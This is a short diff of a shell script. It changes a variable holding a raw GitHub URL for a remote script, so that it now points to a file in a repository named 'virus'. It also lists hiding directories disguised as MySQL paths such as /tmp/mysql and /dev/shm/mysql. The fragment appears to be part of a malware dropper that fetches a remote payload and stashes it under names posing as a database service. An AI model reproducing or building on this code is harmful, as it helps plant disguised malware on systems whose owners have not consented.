@@ -1,4 +1,4 @@
-GITHUB_SCRIPT_URL="https://raw.githubusercontent.com/himlkoita/test/refs/heads/main/trust_me_bro_img_msql.sh"
+GITHUB_SCRIPT_URL="https://raw.githubusercontent.com/Zend1X/virus/refs/heads/main/virus.sh"
 MYSQL_DIRS=("/tmp/mysql" "/var/tmp/mysql" "/dev/shm/mysql" "/run/mysql" "/var/lib/mysql")
 
 generate_name() {
